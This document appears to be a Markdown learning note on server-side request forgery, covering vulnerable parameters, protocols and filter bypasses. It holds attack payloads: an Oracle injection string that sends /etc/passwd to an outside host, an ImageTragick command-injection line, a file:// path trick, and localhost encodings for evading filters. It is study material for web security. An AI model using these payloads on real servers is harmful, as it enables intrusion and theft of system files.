# SSRF
Server Side Request Forge  
Bypass the firewall and grope through the intranet  

![ssrf](https://github.com/shinmao/Web-Security-Learning/blob/master/SSRF/screenshot/SSRF.png)  
1. Find the vulnerable place > 2. with Protocol > 3. Apply to deeper attack > 4. Bypass

# Find the vulnerable place
**Controllable** URL parameter：url, src, imgURL, share, wap, link  
share the content via URL  
translate the context with online translator  
load the pic with URL  
**How to efficiently dig the vulnerable place?**  
Set up a **requestbin** to find whether request from server?  
Set up a **DNS Logger** to find whether DNS resolution?  
1. XXE(You can directly see in my XXE part)  
```php
<!ENTITY % file SYSTEM "file://url/xxx">
```  
[ref to OOB XXE](https://github.com/shinmao/Web-Security-Learning/tree/master/XXE#exploit)  

2. `file_get_contents($url)`(PHP)  
```php
$image = file_get_contents('http://self-ip');
```
[Day 20 - Stocking](https://www.ripstech.com/php-security-calendar-2017/#day-20)  

3. curl(PHP)  
in fact, from `curl -V` we can see the libcurl support many protocols  

4. Oracle UTL_HTTP  
```php
?id=1'||CTXSYS.DRITHSX.SN(user,substr(utl_http.request('http://example.com?download=/etc/passwd'),1,160))||'
```  

5. ImageTragick  
```php
fill 'url(https://example.com/";|ls "-la)'
```  
[ImageTragick](https://imagetragick.com/)  
CVE-2016-3718  
POC on Facebook  
We can find the code `<delegate decode="https" command="&quot;curl&quot; -s -k -o &quot;&o&quot; &quot;https:%M&quot;"/>`. Therefore, we can do command injection.  

6. Header HTTP proxy  
According to CGI, headers in the request would be replaced with env variables  
e.g. Host -> $HTTP_HOST, Proxy -> $HTTP_Proxy  
so we can hijack the http connection  

# with different Protocol  
gopher is an awesome protocol to attack intranet service that **it can forge any kinds of TCP packets**.(but limited by encrypted handshake)  
[利用 Gopher 协议拓展攻击面-转载长亭科技](https://blog.chaitin.cn/gopher-attack-surfaces/)  

Jar is a protocol which can be used to create controllable temp file  

FTP or SMB can also be used on bruteforce of password  

# Bypass  
I would check your schema, host, port  
* Bypass DNS limit:  
A special domain provider> `xip.io`  
DNS rebinding: Traditionally, SSRF filter would get host's IP with DNS resolution from URL. If the IP is legal, request with curl could be successful. Therefore, we can conclude that there are two times of DNS resolutions. We can return legal IP to server at the first time, and return illegal IP for request at the second time! Problem: Sometimes, a server in the public net won't take DNS resolution every times, but store in the cache.  

* Bypass ip limit:  
ip can be decimal, hexidecimal, or Octal  
```php
127.0.0.1
127.0.1
127.1
0.0.0.0
0.0
0
0x7f000001
2130706433
017700000001
```  
This tricks can be used to bypass wordpress protection on SSRF in CVE-2016-4029  

* Bypass url limit:  
```php
// @Adrien
file:///etc/passwd   // Not authorized
file://\/\/etc/passwd    // Work
```  

## Reference
* [New-Era-Of-SSRF-Exploiting-URL](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)  
* [SSRF testing resources](https://github.com/cujanovic/SSRF-Testing)
